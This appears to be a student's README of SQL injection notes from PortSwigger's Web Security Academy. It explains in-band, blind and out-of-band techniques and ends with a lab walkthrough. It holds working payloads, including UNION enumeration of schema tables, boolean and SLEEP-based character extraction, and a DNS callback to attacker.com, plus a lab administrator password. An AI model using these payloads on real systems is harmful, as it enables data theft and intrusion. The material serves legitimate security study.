# SQLi-
In this Repository will be on SQL injection which learned from Web Security Academy

# What is SQL injection (SQLi)?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

# Main SQL injection categories:
1. In-band
2. Out-of-band
3. Inferential or Blind

 These are the **three main categories of SQL Injection (SQLi)**. Understanding them is essential for web penetration testing and security interviews.

---

# SQL Injection Categories

```
                   SQL Injection
                         │
        ┌────────────────┼─────────────────┐
        │                │                 │
     In-band        Inferential        Out-of-band
                      (Blind)
```

---

# 1. In-band SQL Injection

This is the **most common** and **easiest** type of SQL injection.

### Definition

The attacker sends the payload **and receives the data through the same communication channel (HTTP response).**

```
Attacker
    │
    │ SQL Payload
    ▼
Web Application
    │
    ▼
Database
    │
    ▼
Sensitive Data
    │
    ▼
HTTP Response
    │
    ▼
Attacker
```

Everything happens through one channel.

---

## Types of In-band SQLi

### A. Error-Based SQL Injection

The attacker forces the database to generate an error.

The error message leaks information such as

* Database version
* Table names
* Column names
* SQL query
* Database type

Example:

```
'
```

If vulnerable:

```
SQL syntax error near ''
```

Now we know the application is using SQL.

---

Example:

```
?id=1'
```

Response:

```
Unknown column 'xyz'
```

This tells us

* query structure
* number of columns
* database type

---

### B. UNION-Based SQL Injection

Uses the SQL `UNION` operator.

Example query:

```sql
SELECT name,price
FROM products
WHERE id=1;
```

Attacker changes it into

```sql
SELECT name,price
FROM products
WHERE id=1

UNION

SELECT username,password
FROM users;
```

Now the response shows

```
Laptop      50000
Phone       30000

admin       hash123
john        hash456
```

The attacker successfully retrieves data.

---

Advantages

* Fast
* Easy
* Very powerful

---

# 2. Inferential (Blind) SQL Injection

This is called **Blind SQL Injection** because the application **does not display database errors or query results**.

The attacker **infers** information by observing how the application behaves.

```
Attacker
     │
Payload
     │
     ▼
Application
     │
Database
     │
Application behavior changes
     │
     ▼
Attacker guesses data
```

No direct data is returned.

---

## Types of Blind SQLi

### A. Boolean-Based Blind SQLi

The attacker asks the database **True/False questions**.

Example:

```
?id=1 AND 1=1
```

Response

```
Product Found
```

Now try

```
?id=1 AND 1=2
```

Response

```
No Product Found
```

The different responses indicate the condition's truth value.

---

### Extracting Data

Suppose we want to know the first letter of the database name.

```
AND SUBSTRING(database(),1,1)='m'
```

If page loads normally

```
TRUE
```

Else

```
FALSE
```

Repeat for

```
a
b
c
d
...
```

Eventually:

```
m ✔
```

Next character

```
SUBSTRING(database(),2,1)
```

Continue until the full name is discovered.

---

### B. Time-Based Blind SQLi

Sometimes the page always looks identical.

So the attacker measures **response time** instead.

Example (MySQL):

```sql
AND IF(1=1,SLEEP(5),0)
```

Response takes

```
5 seconds
```

Now

```sql
AND IF(1=2,SLEEP(5),0)
```

Returns immediately.

The delay reveals whether the condition is true.

---

Extracting characters:

```sql
IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)
```

If delayed

```
First letter = a
```

Otherwise

```
Try b
Try c
Try d
...
```

---

Advantages

* Works even when errors are hidden
* Very common in real applications

Disadvantages

* Slow
* Requires many requests

---

# 3. Out-of-band SQL Injection (OAST)

This is the **least common** type of SQL injection.

Instead of returning data in the HTTP response, the database sends it through another communication channel.

Example channels:

* DNS
* HTTP
* SMB (depending on the DBMS and environment)

```
Attacker
      │
Payload
      ▼
Web App
      ▼
Database
      │
      ├────────DNS────────► Attacker Server
      │
      └────────HTTP───────► Attacker Server
```

The attacker receives the data through this separate channel.

---

Example Concept

An attacker causes the database to make a DNS lookup to a domain they control, such as:

```
secret.attacker.com
```

When the attacker observes that lookup, it confirms the database executed the injected command and can sometimes carry encoded data.

---

Requirements

* Database supports external network requests.
* Outbound network access is allowed.
* Attacker controls an external server.

---

Advantages

* Useful when no data is returned in HTTP responses.
* Can bypass some filtering and logging mechanisms.

Disadvantages

* Rare.
* Depends on specific database features and network configuration.

---

# Comparison Table

| Feature                 | In-band                  | Blind (Inferential)       | Out-of-band                         |
| ----------------------- | ------------------------ | ------------------------- | ----------------------------------- |
| Data returned directly  | ✅ Yes                    | ❌ No                      | ❌ No (returned via another channel) |
| Uses same HTTP response | ✅ Yes                    | ✅ Yes (behavior only)     | ❌ No                                |
| Speed                   | Fast                     | Slow                      | Medium                              |
| Difficulty              | Easy                     | Medium–Hard               | Hard                                |
| Most common             | ✅ Yes                    | ✅ Very common             | ❌ Rare                              |
| Main techniques         | Error-based, UNION-based | Boolean-based, Time-based | DNS/HTTP callbacks                  |

---

# Quick Interview Revision

* **In-band SQLi:** Payload and results travel through the same HTTP response. Includes **Error-based** and **UNION-based** SQL injection.
* **Inferential (Blind) SQLi:** No direct output. The attacker infers information using **Boolean-based** responses or **Time-based** delays.
* **Out-of-band SQLi:** Data is retrieved through a different communication channel (such as DNS or HTTP requests initiated by the database) when direct responses are unavailable.

For web penetration testing labs (such as PortSwigger Web Security Academy), you'll most frequently encounter **In-band** and **Blind SQL Injection**. **Out-of-band** SQL injection is less common and is typically demonstrated in more advanced scenarios.

------------------------------------------------------------------------------------------

# Retrieving hidden data
Imagine a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:

https://insecure-website.com/products?category=Gifts
This causes the application to make a SQL query to retrieve details of the relevant products from the database:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
This SQL query asks the database to return:

all details (*)
from the products table
where the category is Gifts
and released is 1.
The restriction released = 1 is being used to hide products that are not released. We could assume for unreleased products, released = 0.

# Examining the database: SQL injection attack, listing the database contents on non-Oracle databases
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

# Suppose you find a SQL Injection vulnerability, but you do not know:
    table names
    column names
   database structure
Then the attack becomes a process of database enumeration.  

1. we have to check how much initial query can return columns we can  one or two:
  |--> '+UNION+SELECT+NULL--' --> for one column
  |--> '+UNION+SELECT+NULL,NULL--'  for two column

2.   then we have to know the information tables(meta data of the tables)
3.    '+UNION+SELECT+table_name,+NULL+FROM+table_schema.tables--'
        # table_schema is used for to find the metadata of the table

   then we have to manual find the table that contain the user credentials like example: 
   # users_tcadyp ---> name of the tab;le contain the credentials
4.  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_tcadyp'--'
    shows--->     
    |---> email
    |--->password_onwjwp
    |---> username_saysjv

# Find the administrator cederitenials
'+UNION+SELECT+username_saysiv,+password_onwjwp+FROM+users_tcadyp--'
---> administrator
     5ptkbuxzohq9l6c22js3

